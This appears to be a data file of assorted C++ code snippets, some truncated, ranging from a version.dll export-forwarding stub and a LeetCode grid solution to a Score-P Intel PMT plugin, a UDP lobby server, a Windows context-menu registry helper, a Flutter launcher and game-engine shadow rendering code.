szWinDir, LPCWSTR szAppDir, LPWSTR szCurDir, PUINT lpuCurDirLen, LPWSTR szDestDir, PUINT lpuDestDirLen) {\n    D(VerFindFileW, uFlags, szFileName, szWinDir, szAppDir, szCurDir, lpuCurDirLen, szDestDir, lpuDestDirLen);\n}\n\n\n// Function Name     : VerInstallFileA\n// Ordinal           : 12 (0xc)\nextern \"C\" DWORD WINAPI  VerInstallFileA (DWORD uFlags, LPCSTR ",
    "#include<bits/stdc++.h>\n\nusing namespace std;\nclass Solution {\npublic:\n    int numEnclaves(vector<vector<int>>& grid) {\n        int n = grid.size();\n        int m = grid[0].size();\n\n        queue<pair<int,int>> q;\n        vector<vector<int>> vis(n, vector<int>(m, 0));\n        for(int i=0;i<n;i++){\n            for(int j=0;j<m;j++){\n                if(i==0 || i == n-1 || j==0 || j==m-1){\n                    if(grid[i][j] == 1){\n                        q.push({i, j});\n                        vis[i][j] = 1;\n                    }\n                    \n                }\n            }\n        }\n\n        int cnt =0;\n        int drow[] = {-1,0,1,0};\n        int dcol[] = {0,1,0,-1};\n        while(!q.empty()){\n            int r = q.front().first;\n            int c = q.front().second;\n            q.pop();\n\n            for(int i=0;i<4;i++){\n                int nrow = r + drow[i];\n                int ncol = c + dcol[i];\n\n                if(nrow >= 0 && nrow < n && ncol >= 0 && ncol <m && \n                    !vis[nrow][ncol] && grid[nrow][ncol] ==1){\n                        vis[nrow][ncol] = 1;\n                        q.push({nrow, ncol});\n                    }\n            }\n        }\n        for(int i=0;i<n;i++){\n            for(int j=0;j<m;j++){\n                if(!vis[i][j] && grid[i][j] == 1) cnt++;\n            }\n        }\n        return cnt;\n    }\n};",
    "\n#include <scorep/plugin/plugin.hpp>\n\n#include <cstdint>\n#include <filesystem>\n#include <mutex>\n#include <regex>\n#include <thread>\n#include <vector>\n\n#include <libintelpmt/libintelpmt.hpp>\n\nusing pmt_id = std::pair<std::filesystem::path, uint64_t>;\n\nusing TVPair = std::pair<scorep::chrono::ticks, double>;\n\nclass IntelPMTMeasurementThread\n{\npublic:\n    IntelPMTMeasurementThread(intelpmt::Device& dev, std::chrono::milliseconds interval)\n    : instance_(dev.open()), interval_(interval)\n    {\n    }\n\n    void add_counter(uint64_t counter)\n    {\n        counters_.emplace_back(counter);\n        data_[counter] = std::vector<TVPair>();\n    }\n\n    void measurement()\n    {\n        while (!stop_)\n        {\n            for (auto& counter : counters_)\n            {\n                std::lock_guard<std::mutex> lock(read_mutex_);\n\n                double value = instance_.read_counter(counter);\n\n                data_.at(counter).emplace_back(scorep::chrono::measurement_clock::now(), value);\n            }\n            std::this_thread::sleep_for(interval_);\n        }\n    }\n\n    void start()\n    {\n        thread_ = std::thread([this]() { this->measurement(); });\n    }\n\n    void stop()\n    {\n        stop_ = true;\n\n        if (thread_.joinable())\n        {\n            thread_.join();\n        }\n    }\n\n    std::vector<TVPair> get_values_for_sensor(uint64_t counter)\n    {\n        std::lock_guard<std::mutex> lock(read_mutex_);\n        auto ret = data_.at(counter);\n        data_.at(counter).clear();\n        return ret;\n    }\n\nprivate:\n    bool stop_ = false;\n    std::mutex read_mutex_;\n    intelpmt::DeviceInstance instance_;\n    std::vector<uint64_t> counters_;\n    std::chrono::milliseconds interval_;\n    std::map<uint64_t, std::vector<TVPair>> data_;\n    std::thread thread_;\n};\n\nusing namespace scorep::plugin::policy;\nusing scorep::plugin::logging;\n\ntemplate <typename T, typename Policies>\nusing intelpmt_object_id = object_id<pmt_id, T, Policies>;\n\nclass intelpmt_plugin\n: public scorep::plugin::base<intelpmt_plugin, async, once, scorep_clock, intelpmt_object_id>\n{\npublic:\n    intelpmt_plugin()\n    : measurement_interval_(\n          std::chrono::milliseconds(stoi(scorep::environment_variable::get(\"interval\", \"50\"))))\n    {\n    }\n\n    std::vector<scorep::plugin::metric_property>\n    get_metric_properties(const std::string& metric_name)\n    {\n        std::vector<scorep::plugin::metric_property> counters;\n\n        std::regex counter_regex(\"([^:]+)::(.+)\");\n        std::smatch counter_match;\n\n        if (std::regex_match(metric_name, counter_match, counter_regex))\n        {\n            std::string metric_path = counter_match[1];\n            auto& devices = intelpmt::get_pmt_devices();\n            auto dev = std::find_if(devices.begin(), devices.end(), [metric_path](auto& arg) {\n                return arg.get_path() == metric_path;\n            });\n\n            if (dev == devices.end())\n            {\n                logging::warn() << \"Unknown device: \" << metric_path << \", ignored\";\n                return {};\n            }\n\n            if (pmts_.count(metric_path) == 0)\n            {\n                pmts_.emplace(std::piecewise_construct, std::forward_as_tuple(metric_path),\n                              std::forward_as_tuple(*dev, measurement_interval_));\n            }\n\n            if (counter_match[2] == \"*\")\n            {\n                for (auto& counter : dev->get_counter_names())\n                {\n                    pmts_.at(metric_path).add_counter(counter.second);\n\n                    counters.push_back(\n                        scorep::plugin::metric_property(metric_name, metric_name,\n                                                        dev->get_units().at(counter.second).unit)\n                            .absolute_point()\n                            .value_double());\n\n                    make_handle(metric_name, metric_path, counter.second);\n                }\n            }\n            else\n            {\n                std::string counter_name = counter_match[2];\n                auto& counter_names = dev->get_counter_names();\n                auto counter =\n                    std::find_if(counter_names.begin(), counter_names.end(),\n                                 [&counter_name](auto arg) { return arg.first == counter_name; });\n\n                if (counter != counter_names.end())\n                {\n\n                    pmts_.at(metric_path).add_counter(counter->second);\n\n                    counters.push_back(\n                        scorep::plugin::metric_property(metric_name, metric_name,\n                                                        dev->get_units().at(counter->second).unit)\n                            .absolute_point()\n                            .value_double());\n\n                    make_handle(metric_name, metric_path, counter->second);\n                }\n                else\n                {\n                    logging::warn() << \"Could not find counter: \" << counter_name << \" in device \"\n                    ",
    "#include <iostream>\nusing namespace std;\n\nclass chuoi {\n\tprivate:\n\t\tstring str;\n\t\tint len;\n\tpublic:\n\t\tchuoi() {\n\t\t\tstr = \"\";\n\t\t\tlen = 0;\n\t\t}\n\t\tchuoi(string s) {\n\t        len = s.length();\n\t        str = s;\n    \t}\n    \tvoid nhap();\n    \tvoid xuat();\n    \tchar character(int i);\n    \tchuoi ghep(chuoi b);\n};\n\nvoid chuoi::nhap() {\n\tcout << \"Nhap chuoi: \";\n    getline(cin, str);\n    len = str.length();\n}\n\nvoid chuoi::xuat() {\n\tcout << str << endl;\n}\n\nchar chuoi::character(int i) {\n    if (i >= 0 && i < len) {\n        return str[i];\n    }\n\telse {\n        cout << \"Vi tri khong hop le!\" << endl;\n        return '\\0';\n    }\n}\n\nchuoi chuoi::ghep(chuoi a) {\n\tchuoi ketqua;\n\tketqua.str = str + a.str;\n\tketqua.len = len + a.len;\n\treturn ketqua;\n}\n\nint main() {\n\tchuoi str1, str2;\n    str1.nhap();\n    str2.nhap();\n    \n    cout << \"Chuoi thu nhat la: \";\n    str1.xuat();\n    \n    cout << \"Chuoi thu hai la: \";\n    str2.xuat();\n    \n    cout << \"Ky tu tai vi tri 3 cua chuoi thu nhat la: \" << str1.character(2) << endl;\n    \n    chuoi ketqua = str1.ghep(str2);\n    cout << \"Chuoi ket qua la: \";\n    ketqua.xuat();\n    \n\treturn 0;\n}",
    "#include \"UdpServer.hpp\"\n#include <random>\n#include <iostream>\n#include <asio.hpp>\n#include \"client/client.hpp\"\n#include \"client/ClientSaver.hpp\"\n\n/**\n * @class UdpServer\n * @brief Implements a UDP server for handling client communication, lobby management, and host selection based on latency.\n */\nUdpServer::UdpServer(asio::io_context& io_context, short port)\n    : socket_(io_context, udp::endpoint(udp::v4(), port)), io_context_(io_context) {\n    function_map_ = {\n        {\"create_lobby\", [this](const std::string& message) { create_lobby(message); }},\n        {\"join_lobby\", [this](const std::string& message) { join_lobby(message); }},\n        {\"leave_lobby\", [this](const std::string& message) { leave_lobby(message); }},\n        {\"start_game\", [this](const std::string& message) { ping_to_choose_host(remote_endpoint_); }},\n        {\"logout\", [this](const std::string& message) { logout(message); }},\n        {\"start_game\", [this](const std::string& message) { ping_to_choose_host(remote_endpoint_); }},\n        {\"ping\", [this](const std::string& message) { send_ping(remote_endpoint_); }}\n    };\n    message_id_counter_ = 0;\n    receive_thread_ = std::thread(&UdpServer::receive_loop, this);\n    server_loop();\n}\n\n/**\n * @brief Destructor for UdpServer. Joins the receive thread if it is still joinable.\n */\nUdpServer::~UdpServer() {\n    std::cout << \"Server destructor\" << std::endl;\n    if (receive_thread_.joinable()) {\n        receive_thread_.join();\n    }\n}\n\n/**\n * @brief Starts asynchronous receiving of messages from clients.\n */\nvoid UdpServer::start_receive() {\n    socket_.async_receive_from(\n        asio::buffer(recv_buffer_), remote_endpoint_,\n        [this](std::error_code ec, std::size_t bytes_recvd) {\n            if (!ec && bytes_recvd > 0) {\n                handle_receive(bytes_recvd);\n            } else {\n                start_receive();\n            }\n        });\n}\n\n/**\n * @brief Main loop for receiving messages. Runs the io_context to handle asynchronous operations.\n */\nvoid UdpServer::receive_loop() {\n    start_receive();\n    io_context_.run();\n}\n\n/**\n * @brief Finds and returns a client based on the provided UDP endpoint.\n *\n * @param client_endpoint The endpoint of the client to retrieve.\n * @return The client associated with the provided endpoint.\n * @throws std::runtime_error if the client is not found.\n */\nconst server::client UdpServer::get_client(const udp::endpoint &client_endpoint) const{\n    for (const auto& cli : connected_clients_) {\n        if (cli.get_endpoint() == client_endpoint) {\n            return cli;\n        }\n    }\n    throw std::runtime_error(\"Client not found\");\n}\n\n/**\n * @brief Creates a new lobby and assigns the client as the host.\n *\n * @param message The message from the client, containing the lobby creation request.\n */\nvoid UdpServer::create_lobby(const std::string& message) {\n    static std::random_device rd; // Seed for the random number engine\n    static std::mt19937 gen(rd()); // Mersenne Twister engine\n    static std::uniform_int_distribution<> dis(1, 1000000); // Uniform distribution\n\n    int lobby_id = dis(gen); // Generate a random lobby ID\n    Lobby new_lobby(lobby_id, get_client(remote_endpoint_));\n\n    new_lobby.add_client(get_client(remote_endpoint_));\n    lobbies_.insert(std::make_pair(new_lobby.get_id(), new_lobby));\n    std::cout << \"Lobby created: \" << new_lobby.get_id() << std::endl;\n    std::cout << \"Client added to lobby: \" << remote_endpoint_.address().to_string() << \":\" << remote_endpoint_.port()\n            << std::endl;\n}\n\n/**\n * @brief Allows a client to join an existing lobby.\n *\n * @param message The message containing the lobby ID to join.\n * @throws std::runtime_error if the lobby is not found.\n */\nvoid UdpServer::join_lobby(const std::string& message) {\n    const int lobby_id = std::stoi(message.substr(10));\n\n    try {\n        lobbies_.at(lobby_id).add_client(get_client(remote_endpoint_));\n        std::cout << \"Client joined lobby: \" << remote_endpoint_.address().to_string() << \":\" << remote_endpoint_.\n                port() << std::endl;\n    } catch (const std::out_of_range &e) {\n        throw std::runtime_error(\"Lobby not found\");\n    }\n}\n\n/**\n * @brief Allows a client to leave a lobby. Deletes the lobby if the client is the host.\n *\n * @param message The message containing the lobby ID to leave.\n * @throws std::runtime_error if the lobby is not found.\n */\nvoid UdpServer::leave_lobby(std::string message) {\n    const int lobby_id = std::stoi(message.substr(11));\n\n    try {\n        auto client = get_client(remote_endpoint_);\n\n        if (client.is_host()) {\n            lobbies_.erase(lobby_id);\n            std::cout << \"Lobby deleted: \" << lobby_id << std::endl;\n        } else {\n            lobbies_.at(lobby_id).remove_client(client);\n            std::cout << \"Client left lobby: \" << remote_endpoint_.address().to_string() << \":\" << remote_endpoint_.\n                port() << std::endl;\n        }\n    } catch (const std::out_of_range &e) {\n        ",
    "#include \"QueryHandler.hpp\"\n#include \"Logger.hpp\"\n#include <format>\n#include <mutex>\n\nnamespace network {\n    QueryHandler::~QueryHandler() {\n        if (this->_workers.size() > 0) {\n            Logger::log(LogLevel::INFO, std::format(\"Waiting for {0} workers\", this->_workers.size()));\n        }\n        for (auto& worker: this->_workers) {\n            worker->join();\n        }\n    }\n\n    QueryHandler& QueryHandler::getInstance() {\n        std::lock_guard<std::mutex> lock(_mutex);\n        if (_instance == nullptr) {\n            _instance = std::unique_ptr<QueryHandler>(new QueryHandler());\n        }\n        return *_instance;\n    }\n\n    void QueryHandler::addQuery(std::pair<Client, Query> query) {\n        this->_pendingQueries.push(query);\n    }\n\n    void QueryHandler::executeQuery(std::pair<Client, Query> query) {\n        auto worker = std::make_shared<Worker>(query);\n        this->_workers.emplace_back(worker);\n    }\n\n    void QueryHandler::executeQueries() {\n        const std::size_t size = this->_pendingQueries.size();\n        for (std::size_t i = 0; i < size; i++) {\n            auto query = this->_pendingQueries.front();\n            this->_pendingQueries.pop();\n            this->executeQuery(query);\n        }\n    }\n\n    void QueryHandler::checkWorkers() {\n        for (auto it = this->_workers.begin(); it != this->_workers.end();) {\n            auto worker = *it;\n            if (worker->isReady()) {\n                Logger::log(LogLevel::INFO, \"End of worker\");\n                worker->join();\n                it = this->_workers.erase(it);\n            } else {\n                it++;\n            }\n        }\n    }\n\n    std::unique_ptr<QueryHandler> QueryHandler::_instance(nullptr);\n    std::mutex QueryHandler::_mutex;\n}\n",
    "#include <windows.h>\n#include <lmcons.h>\n#include <fstream>\n#include <string>\n\nvoid showMessage(const std::wstring& message, const std::wstring& title = L\"Th\u00f4ng b\u00e1o\") {\n    MessageBoxW(NULL, message.c_str(), title.c_str(), MB_OK | MB_ICONINFORMATION);\n}\n\nvoid createRegFile(const std::wstring& username) {\n    std::wofstream regFile(L\"add_cursor.reg\");\n\n    if (!regFile.is_open()) {\n        showMessage(L\"Vui l\u00f2ng ch\u1ea1y l\u1ea1i ch\u01b0\u01a1ng tr\u00ecnh v\u1edbi quy\u1ec1n admin\", L\"L\u1ed7i\");\n        return;\n    }\n    regFile << L\"Windows Registry Editor Version 5.00\\n\\n\";\n    regFile << L\"[HKEY_CLASSES_ROOT\\\\directory\\\\background\\\\shell\\\\Cursor]\\n\";\n    regFile << L\"\\\"Icon\\\"=\\\"C:\\\\\\\\Users\\\\\\\\\" << username << L\"\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Programs\\\\\\\\cursor\\\\\\\\Cursor.exe\\\"\\n\";\n    regFile << L\"@=\\\"Open w&ith Cursor\\\"\\n\\n\";\n    regFile << L\"[HKEY_CLASSES_ROOT\\\\directory\\\\background\\\\shell\\\\Cursor\\\\command]\\n\";\n    regFile << L\"@=\\\"\\\\\\\"C:\\\\\\\\Users\\\\\\\\\" << username << L\"\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Programs\\\\\\\\cursor\\\\\\\\Cursor.exe\\\\\\\" \\\\\\\"%V\\\\\\\"\\\"\\n\";\n    regFile.close();\n\n    if (system(\"regedit /s add_cursor.reg\") != 0) {\n        showMessage(L\"Thi\u1ebfu quy\u1ec1n truy c\u1eadp, vui l\u00f2ng ch\u1ea1y l\u1ea1i ch\u01b0\u01a1ng tr\u00ecnh v\u1edbi quy\u1ec1n admin\", L\"L\u1ed7i\");\n        return;\n    }\n    if (std::remove(\"add_cursor.reg\") != 0) {\n        showMessage(L\"Kh\u00f4ng th\u1ec3 xo\u00e1 t\u1ec7p .reg\", L\"L\u1ed7i\");\n    } else {\n        showMessage(L\"\u0110\u00e3 th\u00eam Cursor v\u00e0o menu!\");\n    }\n}\n\nint main() {\n    WCHAR username[UNLEN + 1];\n    DWORD username_len = UNLEN + 1;\n    if (!GetUserNameW(username, &username_len)) {\n        showMessage(L\"Kh\u00f4ng th\u1ec3 l\u1ea5y t\u00ean ng\u01b0\u1eddi d\u00f9ng. L\u1ed7i: \" + std::to_wstring(GetLastError()), L\"L\u1ed7i\");\n        return 1;\n    }\n    createRegFile(username);\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pemrograman_pert3\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "///////////////////////////////////////////////////////////////////////////////////////////\n/** \\file\n *  Filename: osCharacterShadow.cpp\n * \n *  His:      River created @ 2004-12-11\n *\n *  Desc:     \u5f15\u64ce\u4e2d\u4eba\u7269\u9634\u5f71\u76f8\u5173\u7684\u51fd\u6570\u3002\n * \n *  \"\u4f60\u6709\u591a\u5927\u7684\u6210\u5c31\uff0c\u5c31\u8981\u53d7\u5230\u591a\u5927\u7684\u4e89\u8bae\" \n *\n */\n///////////////////////////////////////////////////////////////////////////////////////////\n# include \"stdafx.h\"\n# include \"../include/osCharacter.h\"\n# include \"../../mfpipe/include/middlePipe.h\"\n# include \"../../terrain/include/fdFieldMgr.h\"\n# include \"../../backpipe/include/mainEngine.h\"\n\n//! \u8fb9\u5217\u8868\u6587\u4ef6\u5bf9\u5e94\u7684\u6269\u5c55\u540d\n# define EDGEFILE_EXTENT   \".edg\"\n\n//! River added @ 2008-11-19:\u7528\u4e8e\u63a7\u5236\u4eba\u7269\u9634\u5f71\u7684\u900f\u660e\u5ea6\uff0c0\u5b8c\u5168\u900f\u660e.1\u5b8c\u5168\u4e0d\u900f\u660e\nOSENGINE_API float                  g_fShadowChroma = 0.2f;\n\n//! \u8bbe\u5907\u91cd\u8bbe\u65f6\uff0c\u9634\u5f71\u90e8\u5206\u8c03\u5165\uff0c\u4f7f\u7528\u7684\u4e34\u754c\u533a\nCRITICAL_SECTION    g_sShadowSec;\n\n\n# define MAX_VERTEX_PERSKINMESH   4096\n\nosc_fakeGlowData::osc_fakeGlowData()\n{\n\tm_vec3Normal.resize( MAX_VERTEX_PERSKINMESH );\n\tm_iNormalUseNum = 0;\n\tm_fLength = 0.05f;\n\tm_fCurUseLength = m_fLength;\n}\n\nosVec3D* osc_fakeGlowData::get_unUseNormlDataStart( void )\n{\n\treturn &m_vec3Normal[m_iNormalUseNum];\n}\n\nvoid osc_fakeGlowData::set_useNormalNum( int _num )\n{\n\tm_iNormalUseNum += _num;\n\tif( m_iNormalUseNum>MAX_VERTEX_PERSKINMESH )\n\t\tosassert( false );\n}\n\nvoid osc_fakeGlowData::resetNormal( void )\n{\n\tm_iNormalUseNum = 0;\n}\n\nvoid osc_fakeGlowData::set_fakeGlowData( DWORD _color,float _length )\n{\n\tm_dwColor = _color;\n\tm_fLength = _length;\n}\n\n# define MOVE_TIME   4.0f\n\nvoid osc_fakeGlowData::frame_move( void )\n{\n\tguard;\n\n\tfloat t_fEletime = sg_timer::Instance()->get_lastelatime();\n\tstatic bool  t_bUp = true;\n\n\tfloat  t_fCurFrameLength = t_fEletime*m_fLength/MOVE_TIME;\n\n\tif( t_bUp )\n\t{\n\t\tm_fCurUseLength += t_fCurFrameLength;\n\t\tif( m_fCurUseLength > ( this->m_fLength*1.5f ) )\n\t\t{\n\t\t\tm_fCurUseLength = m_fLength*1.5f;\n\t\t\tt_bUp = false;\n\t\t}\n\t}\n\telse\n\t{\n\t\tm_fCurUseLength -= t_fCurFrameLength;\n\t\tif( m_fCurUseLength < ( m_fLength*0.5f ) )\n\t\t{\n\t\t\tm_fCurUseLength = m_fLength*0.5f;\n\t\t\tt_bUp = true;\n\t\t}\t\t\n\t} \n\n\tunguard;\n}\n\n\nosc_fakeGlowData* osc_bpmShadow::m_ptrFakeGlowData = NULL;\n\n\n/** \n\n\u9634\u5f71\u7684\u4f7f\u7528\u63cf\u8ff0\uff1a\n\n\u76ee\u524d\u573a\u666f\u4e3b\u89d2\u4eba\u7269\u7684\u5373\u65f6\u9634\u5f71\u4f7f\u7528Stencil\u7684\u65b9\u5f0f\u8fdb\u884c\u3002\u521a\u5f00\u59cb\u7684\u65f6\u5019\u4f7f\u7528ZPass\u7684\u65b9\u5f0f\uff0c\n\n2006-5-12\u4fee\u6539\u4e3a\u4f7f\u7528ZFail\u7684\u65b9\u5f0f\u3002\n\nZPass\u7684\u65b9\u5f0f\u4e3b\u8981\u95ee\u9898\u5728\u4e8e\u5f53\u8fd1\u526a\u5207\u9762\u5207\u6389\u90e8\u5206ShadowVolume\u540e\uff0c\u4eba\u7269\u7684\u9634\u5f71\u4f1a\u5927\u5757\u7684\u663e\u793a\n\u5728\u5c4f\u5e55\uff0c\u51fa\u73b0\u4e00\u4e9b\u9519\u8bef\n\nZFail\u7684\u9519\u8bef\u5728\u4e8e\u8fdc\u526a\u5207\u9762\u4e5f\u4f1a\u526a\u5207\u6389\u4eba\u7269\u7684ShadowVolume,\u4f1a\u5728\u4eba\u7269\u7684\u9634\u5f71\u4e0a\u663e\u793a\u4e00\u4e2a\u5c0f\u6d1e\uff0c\n\u597d\u5728\u4eba\u7269\u9634\u5f71\u7684\u6d1e\u975e\u5e38\u5c0f\uff0c\u54c1\u8d28\u4e0a\u6bd4ZPass\u4ea7\u751f\u7684\u9519\u8bef\u8981\u597d\u5f88\u591a\u3002\nZFail\u7684\u9634\u5f71\u6295\u5c04\u77e9\u79bb\u4f7f\u7528\u4e86\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u503c\uff0c\u4e3a\u7684\u662f\u8ba9ShadowVolume,\n\u5728\u8fdc\u526a\u5207\u9762\u5185\u90fd\u6b63\u786e\u7684\u5199\u5165StencilBuf.\n\nZFail\u7684\u60c5\u51b5\u4e0b\uff0c\n\u5fc5\u987b\u6e32\u67d3\u4eba\u7269\u671d\u5411\u65b9\u5411\u5149\u7684\u9762\uff0c\u4e0d\u7136\u4f1a\u51fa\u73b0\u900f\u8fc7\u5c71\u53ef\u4ee5\u770b\u89c1\u4eba\u7269\u9634\u5f71\u7684\u60c5\u5f62\n\n\u53ef\u80fd\u662f\u56e0\u4e3a\u4eba\u7269\u7684\u9762\u4e0d\u662f\u5c01\u95ed\u7684\u9762\uff0c\u6240\u4ee5\u5c31\u7b97\u6e32\u67d3\u4eba\u7269\u671d\u5411\u65b9\u5411\u5149\u7684\u9762\uff0c\n\n\n\n\u5728\u5c71\u6321\u4f4f\u4eba\u7269\u7684\u65f6\u5019\uff0c\u4ecd\u7136\u6709\u5c11\u90e8\u5206\u7684\u9634\u5f71\u7834\u9762\u51fa\u73b0\u3002\u8fd9\u4e2a\u95ee\u9898\u6682\u65f6\u6ca1\u6709\u89e3\u51b3\u3002\n\u6709\u4e24\u79cd\u89e3\u51b3\u65b9\u6848\uff1a\u7b2c\u4e00\uff1a\u901a\u8fc7\u76f8\u673a\uff0c\u505a\u4eba\u7269\u4f4d\u7f6e\u548c\u5730\u5f62\u7684\u53ef\u89c1\u6027\uff0c\u5982\u679c\u6b64\u65f6\u770b\u4e0d\u89c1\u4eba\n\u7269\uff0c\u5219\u4e0d\u6e32\u67d3\u4eba\u7269\u7684\u9634\u5f71\uff0c\u7b2c\u4e8c\uff1a\u8bbe\u7f6e\u76f8\u673a\uff0c\u4f7f\u4e0d\u51fa\u73b0\u5c71\u4f53\u6321\u4f4f\u4eba\u7269\u7684\u60c5\u5f62\u3002\nRiver @ 2006-5-13:\n\u6700\u7ec8\u7684\u89e3\u51b3\u65b9\u6848\uff1a\u76f8\u673a\u4f4d\u7f6e\u548c\u7126\u70b9\u7684\u5c04\u7ebf\u4e4b\u95f4\u5982\u679c\u6709\u5730\u5f62\u6321\u4f4f\uff0c\u5219\u4e0d\u6e32\u67d3\u4eba\u7269\u7684\u9634\u5f71\u3002\n\n\n\u4e3a\u4e86\u4f7f\u4eba\u7269\u4e0d\u4ea7\u751f\u81ea\u9634\u5f71\uff0c\u7a0b\u5e8f\u5148\u753b\u4eba\u7269\u7684\u9634\u5f71\uff0c\u7136\u540e\u518d\u753b\u4eba\u7269\u3002\u76f8\u5f53\u4e8e\u4eba\u7269\u628a\u4eba\u7269\u7684\u81ea\u9634\u5f71\n\u90e8\u5206\u7684\u9634\u5f71\u9762\u7247\u6321\u4f4f\u4e86\u3002\n\n**/\n\nstruct SHADOWVERTEX\n{\n    osVec4D     m_vec4Pos;\n    DWORD       m_dwDiffuse;\n};\n\n//! \u7528\u4e8eshadowSquare\u7684\u6e32\u67d3\n#define   SHADOWVERTEX_FVF     (D3DFVF_XYZRHW | D3DFVF_DIFFUSE)\n\n//! \u4f7f\u7528Zpass\u7684\u9634\u5f71\u6e32\u67d3\n# define STENCIL_ZPASS    1\n\n\n//! \u521d\u59cb\u5316\u9759\u6001\u53d8\u91cf\nLPDIRECT3DDEVICE9 osc_bpmShadow::m_pd3dDevice = NULL;\nLPDIRECT3DVERTEXBUFFER9  osc_bpmShadow::m_pVBufShadowSqu = NULL;\n\n\n//@{\n//! \u6e32\u67d3\u9634\u5f71\u65f6\u7528\u5230\u7684\u6e32\u67d3\u72b6\u6001\u5757\u7d22\u5f15\nint osc_bpmShadow::m_iSHDrawState = -1;\nint osc_bpmShadow::m_iSHDrawRestoreState = -1;\nint osc_bpmShadow::m_iShadowSquareState = -1;\nint osc_bpmShadow::m_iShadowSSRestore = -1;\n/** \\brief\n*  \u8bbe\u7f6e\u6e32\u67d3\u72b6\u6001\uff0c\u4f7f\u6e32\u67d3\u7684\u65f6\u5019\uff0c\u53ea\u6e32\u67d3\u51e0\u4f55\u4fe1\u606f\u5230\u5230zbuffer,\u4e0d\u663e\u793a\u3002\n* \n*  \u6709\u9634\u5f71\u7684\u6b66\u5668\u9700\u8981\u5148\u6e32\u67d3\u6b66\u5668\u7684zbuffer,\u7528\u4e8e\u4f7f\u7528\u6b66\u5668\u4e0a\u6ca1\u6709\u9634\u5f71\u7684\u6548\u679c\u3002\n*/\nint osc_bpmShadow::m_iOnlyZbufSB = -1;\nint osc_bpmShadow::m_iRestoreOnlyZbufSB = -1;\n//@}\n\n//! \u5c4f\u5e55\u5bbd\u5ea6\uff0c\u5c4f\u5e55\u9ad8\u5ea6\nfloat osc_bpmShadow::m_fScrWidth = 800.0f;\nfloat osc_bpmShadow::m_fScrHeight = 600.0f;\n\n\n\n//! \u9ed8\u8ba4\u9634\u5f71\u6295\u5c04\u7684\u957f\u5ea6,\u4f7f\u7528\u5927\u91cf\u7684\u8c61\u7d20\u586b\u5145\u6765\u51cf\u5c11\u8fdc\u526a\u5207\u9762\u5904\u7684\u9519\u8bef\n# define DEFAULT_PROJSHADOWLENGTH   60.0f\n\n\nosc_bpmShadow::osc_bpmShadow()\n{\n\tm_ptrBpmVer = NULL;\n\tm_ptrBpmVerAT = NULL;\n\tthis->m_iVerNum = 0;\n\tthis->m_ptrBpmIdx = NULL;\n\tthis->m_iIdxNum = 0;\n\n\tthis->m_bFront = NULL;\n\tm_arrNeiList = NULL;\n\n\t//!  \u8981\u6e32\u67d3\u7684\u8fb9\u7684\u5217\u8868\u3002\n\tm_arrEdgeList = NULL;\n\tm_iEdgeNum = 0;\n\n\t//! \u3000\n\tm_pShadowVBuf = NULL;\n\tm_iShadowVerNum = 0;\n\n\tm_pSourceIdxBuf = NULL;\n\tm_iSourceTriNum = 0;\n\n\t//! \u66f4\u65b0ShadowVolume.\n\tm_bUpdated = false;\n\n\tm_fShadowProjLength = DEFAULT_PROJSHADOWLENGTH;\n\n\tm_bFakeGlow = false;\n\tm_vec3Normal = NULL;\n\n}\n\nosc_bpmShadow::~osc_bpmShadow()\n{\n\trelease_shadowData();\n}\n\n//! \n# define  MAX_SHADERVERMULTI   6\n\n//! \u521d\u59cb\u5316\u9634\u5f71\u6570\u636e\u7ed3\u6784\u3002\u3000\nbool osc_bpmShadow::init_shadowData( const char* _fname )\n{\n\tguard;\n\n\tosassert( _fname&& (_fname[0]) );\n\n\tchar      t_str[256];\n\ts_string   t_strName = _fname;\n\tint   t_size;\n\n\tm_bFront = new bool[m_iIdxNum/3];\n\tm_arrNeiList = new os_neighbour[this->m_iIdxNum/3];\n\n\t//@{\n\t// syq : \u52a0\u5927\u4e3a2\u500d\u7684\u7f13\u51b2\u533a\u5927\u5c0f\u3002\u3000\u65e7\u4ee3\u7801\u5f53\u6e38\u79bb\u7684\u7f51\u683c\u8fb9\u7f18\u591a\u65f6\uff0c\u7f13\u51b2\u533a\u4f1a\u4e0d\u8db3\n\t//m_arrEdgeList = new WORD[ m_iIdxNum ];\n\tm_arrEdgeList = new WORD[ m_iIdxNum * 2 ];\n\t//@}\n\n\tt_strName += EDGEFILE_EXTENT;\n\t// tzz add:\n\t// \u4f7f\u7528CReadFile \u6765\u8bfb\u53d6\u5185\u5bb9,\n\t// \u9632\u6b62\u5728osassert \u629b\u51fa\u5f02\u5e38\u4e4b\u540e\u6ca1\u6709 END_USEGBUF\uff08\u6709\u592a\u591a\u7684osassert\uff09\n\t// \u5bfc\u81f4\u7a0b\u5e8f\u4e0d\u80fd\u6b63\u5e38\u7ec8\u6b62,\u9700\u8981\u7528\u8d44\u6e90\u7ba1\u7406\u5668\u6765\u7ec8\u6b62\n\t//\n\t// \u67e5\u770b CReadFile \u83b7\u5f97\u66f4\u591a\u7684\u4fe1\u606f\n\t// \n\t//t_fstart = START_USEGBUF( t_iGBufIdx );\n\t//int   t_size = read_fileToBuf( \n\t//\t(char*)t_strName.c_str(),t_fstart,TMP_BUFSIZE );\n\t//if( t_size <=0 )\n\t//{\n\t//\tosassert( false );\n\t//\treturn 